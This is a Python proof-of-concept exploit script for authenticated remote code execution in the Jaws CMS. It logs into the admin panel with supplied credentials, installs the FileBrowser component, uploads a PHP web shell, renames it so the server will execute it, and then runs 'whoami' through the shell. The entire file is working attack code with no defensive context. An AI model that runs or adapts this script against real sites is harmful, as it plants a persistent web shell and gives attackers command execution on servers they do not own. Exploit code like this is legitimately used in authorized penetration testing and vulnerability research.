import requests
import random
import sys
if (len(sys.argv) <4):
	print("[+]Usage python jaws-rce.py http://victim.com/ admin admin")
else:
	username = sys.argv[2]
	password = sys.argv[3]
	randnum = (random.randrange(0,100))

	s = requests.Session()

	inputurl = sys.argv[1]
	loginurl = inputurl
	#create session for login
	r = s.get(loginurl)
	data = {"reqGadget":"Users", "reqAction":"Authenticate","referrer":"","loginstep":"1","defaults":"","username":username,"password":password}
	r = s.post(loginurl, data=data)
	#install filebrowser component which will be used for file upload
	installurl = inputurl+"admin.php?reqGadget=Components&reqAction=InstallGadget&comp=FileBrowser"

	r2 = s.get(installurl)

	#generating uniq shell name
	filename1 = "cmd"+str(randnum)+".php"

	filename2 = '"'+filename1+'"'

	uploadurl = inputurl+"admin.php?reqGadget=FileBrowser&reqAction=Files"
	#request for upload shell
	data = {"reqGadget":"FileBrowser", "reqAction":"UploadFile","path":"/","oldname":"","file_title":"","file_description":"","file_fast_url":"","dirname":"","dir_title":"","dir_description":"","dir_fast_url":""}
	data2={"uploadfile":open('cmd.php', 'rb')}
	r3 = s.post(uploadurl, files=data2,data=data)


	#update shell name from cmd to cmd.php to be able to execute
	changeurl = inputurl+"admin.php?reqGadget=FileBrowser&reqAction=UpdateDBFileInfo&restype=json"



	data3 = (f'["/",{filename2},"cmd.php","","cmd.php","cmd"]')
	header = {"Content-type":"application/json"}

	r4 = s.post(changeurl, data=data3,headers=header)

	#execute shell with whoami for example and PoC
	finalurl = inputurl+"data/files/"+filename1+"?c=whoami"


	print("Shell Location===",finalurl)

	r5 = s.get(finalurl)

	print(r5.text)